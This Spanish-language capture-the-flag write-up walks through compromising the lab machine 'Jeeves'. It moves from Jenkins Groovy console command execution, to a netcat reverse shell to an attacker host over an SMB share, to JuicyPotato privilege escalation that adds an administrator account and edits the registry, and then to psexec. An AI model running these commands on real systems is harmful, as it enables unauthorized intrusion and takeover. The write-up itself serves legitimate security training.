# Jeeves

## Enumeración

```bash
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp open msrpc Microsoft Windows RPC
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open http Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

El escaneo muestra 2 paginas webs .

### Puerto 80

La pagina web del `puerto 80` muestra un buscador

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FOIQI4fVUSJHwjB2K8GkV%2Fimage.png?alt=media&#x26;token=f7de2c24-f015-4341-8ac3-a9f96c5dac63" alt=""><figcaption></figcaption></figure>

Al buscar cualquier cosa la pagina muestra un error

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FDTQnczzYotqMmenExKGJ%2Fimage.png?alt=media&#x26;token=ad14bc66-d14b-4ac0-84c5-615891bb38c5" alt=""><figcaption></figcaption></figure>

### Puerto 50000

La pagina web del `puerto 50000` muestra una pagina en html donde parece no haber nada interesante

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FxSFmCRxhxl6mX4SitqMH%2Fimage.png?alt=media&#x26;token=f4125cf5-3c8a-4ce4-b3aa-2902cef79af0" alt=""><figcaption></figcaption></figure>

Al hacer un escaneo de dominios con dirsearch podemos encontrar un directorio oculto `/askjeeves`&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FH9VdXPNrmVXAj7TNH3Gb%2Fimage.png?alt=media&#x26;token=d3085497-137c-458d-96d6-e4f53a91f5a7" alt=""><figcaption></figcaption></figure>

En esa ruta tenemos Jenkins, que es un servidor de automatización de código abierto.&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FZ4EfLwMkRMtQTU2pOLUg%2Fimage.png?alt=media&#x26;token=65c37ae2-6bc1-48a0-ac33-23e59103ebc0" alt=""><figcaption></figcaption></figure>

## Explotación

### Jenkins

Cuando nos topamos con un Jenkins hay que estar atento ya que si aparece la opción "Manage Jenkins". Esta opción trae un modulo donde podemos ejecutar comandos en el lenguaje Groovy.&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FNzMIbThtzvZKsu7WEpD4%2Fimage.png?alt=media&#x26;token=7a8ba68b-f5ce-4a50-8dfd-3ee9ec7d04de" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FCnnGxHpybg1c4GV70Rsz%2Fimage.png?alt=media&#x26;token=cfb3c7c3-2e79-4d28-a78f-956eb2b783c0" alt=""><figcaption></figcaption></figure>

Si buscamos en Internet podemos buscar como ejecutar comandos de shell con Groovy.

```go
println "ls".execute().text
```

Ya que podemos ejecutar comandos podemos hacer una reverse shell. En mi caso voy a crear un servidor SMB en mi maquina de atacante donde tengo un archivo nc.exe. También nos ponemos en escucha para recibir la shell.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

```bash
rlwrap nc -lvnp 4444
```

Y en la consola de Jenkins me mando una shell usando ese archivo

```go
println "\\\\10.10.14.36\\smbFolder\\nc.exe -e cmd 10.10.14.36 4444".execute().text
```

Y ya tendriamos acceso al `user.txt`&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2Fux14dsi8zN1ilrNk2SAo%2Fimage.png?alt=media&#x26;token=cec5a8b4-311b-4c1a-b722-82e51ae3781a" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FBi6v0cfUF3Oyz7QDyfQC%2Fimage.png?alt=media&#x26;token=dc86fd41-c30e-4cd4-bc0b-3ab20c2d3ac9" alt=""><figcaption></figcaption></figure>

## Escalada

Si vemos los privilegios de nuestro usuario con

```bash
whoami /priv
```

Podemos observar que tenemos el privilegio `SeImpersonatePrivilege` activado. Este privilegio se puede explotar con la herramienta `JuicyPotato` de la siguiente manera:

### JuicyPotato

Ya que tenemos un server smb propio vamos a meter el binario de JuicyPotato en el y vamos a pasarlo a la maquina victima.

```powershell
copy \\10.10.14.36\smbFolder\JuicyPotato.exe
```

Ahora intentamos crearnos un usuario usando esta herramienta.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user ub1cu0 Abc123. /add" -l 1337
</strong></code></pre>

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FkFCAX9VguHPdY7TlOhUi%2Fimage.png?alt=media&#x26;token=908163ad-ceff-4072-9b1a-b9fbeeb59176" alt=""><figcaption></figcaption></figure>

Ahora que nos ha funcionado vamos a intentar moverlo al grupo Administradores.

```
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators ub1cu0 /add" -l 1337
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FDJrcqXPL3IOSiShuoFQA%2Fimage.png?alt=media&#x26;token=520bfd6f-18e7-41bb-8b21-f735644f1d31" alt=""><figcaption></figcaption></figure>

Si intentamos checkear el logeo con `netexec` para ver si sale la flag "(Pwned!)" no va a salir, esto se debe a que para que salga, aparte de tener al usuario en el grupo administradores hay que editar un registro que hay en Windows que por defecto no permite la conexión remota con el usuario administrador con SMB.

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2F83bnX2sZ2pKykkwZRUeb%2Fimage.png?alt=media&#x26;token=62a7d6d9-3724-489f-9d0c-483be05b7f6b" alt=""><figcaption></figcaption></figure>

Vamos a editar el registro para permitirlo con:

```powershell
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
```

Y ahora veremos la flag (Pwned!)

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2F2iNbIq2U7V9zphIq2Utr%2Fimage.png?alt=media&#x26;token=28fb830e-7f33-4f57-bf7b-ce1e53bf459f" alt=""><figcaption></figcaption></figure>

### PsExec

Ahora podemos usar la herramienta `PsExec` y usar el servicio smb para conseguir una shell del usuario "Administrator" con el siguiente comando:

```bash
impacket-psexec WORKGROUP/ub1cu0@jeeves.htb cmd.exe
```

Este comando necesita que el usuario tenga la etiqueta (Pwned!) con el netexec y que posea permiso para escribir en alguna carpeta SMB. En este caso con el usuario que hemos creado y que hemos hecho admin tenemos acceso de escritura en el recurso `ADMIN$` pero si no hubiera ningún recurso que cumpliera estos objetivos podríamos crear uno y funcionaría igual.

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FWRCj03ie2PmTlMuJ4Jbp%2Fimage.png?alt=media&#x26;token=06962b0f-6793-4153-8910-c7fd5746e51d" alt=""><figcaption></figcaption></figure>

### Alternate Data Streams

Ahora ya tendríamos acceso a la flag `root.txt` pero en este caso no es así ya que, si vamos a la carpeta donde debería estar encontraremos este archivo que nos incita a buscar mas profundo.

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2Fqo5sbamx16kvQg0YwUf2%2Fimage.png?alt=media&#x26;token=c34cef95-8776-49ca-bcd1-ee96f11a610f" alt=""><figcaption></figcaption></figure>

En este caso hay que saber de la existencia de las Data Alternate Stream, que en resumen en una forma de guardar texto oculto en ficheros de texto. Esto se puede ver si ponemos la flag `/r` a `dir` .

&#x20;&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FERuENUow6JowIBENrBNY%2Fimage.png?alt=media&#x26;token=d8551993-21d9-4dbb-9e88-6514bc2a0705" alt=""><figcaption></figcaption></figure>

Ahora que vemos el archivo oculto podemos ver su contenido volcandolo al comando more de la siguiente manera:

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FPtOMRzegBgvhrOUvc8fo%2Fimage.png?alt=media&#x26;token=47dae2d3-da56-4417-99c1-654a00d1543c" alt=""><figcaption></figcaption></figure>

Y así habremos completado la maquina Jeeves. Gracias por leer!&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2F6Ed0pvcJfCGvDm0rgHSp%2Fimage.png?alt=media&#x26;token=c898ed26-2658-4944-8598-739f06dac8ab" alt=""><figcaption></figcaption></figure>
